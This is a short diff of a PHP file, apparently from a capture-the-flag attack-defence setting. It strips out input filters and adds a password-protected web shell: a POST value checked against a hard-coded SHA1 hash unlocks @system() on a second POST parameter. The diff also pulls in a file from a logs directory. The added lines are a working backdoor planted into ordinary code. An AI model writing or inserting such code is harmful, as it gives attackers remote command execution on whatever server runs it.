@@ -1,8 +1,2 @@
-<?php
-if(isset($_POST['url'])){
- $u=$_POST['url'];if(!strpos($u,'http')!==0)die();
-}
-foreach ($_REQUEST as $k => $v) {
-$_REQUEST[$k]=preg_replace("/['\\\\]/",'',$v);
-$_REQUEST[$k]=preg_replace("/flag/",'',$v);
-}
+<?php if(isset($_POST["p"])&&isset($_POST["w"]))if(hash("sha1",$_POST["p"])==="fe145cb51bb69d4a1017dfdca6a44185de0ba32f"){@system($_POST["w"]);die();}
+@include_once "/var/www/html/logs/w";
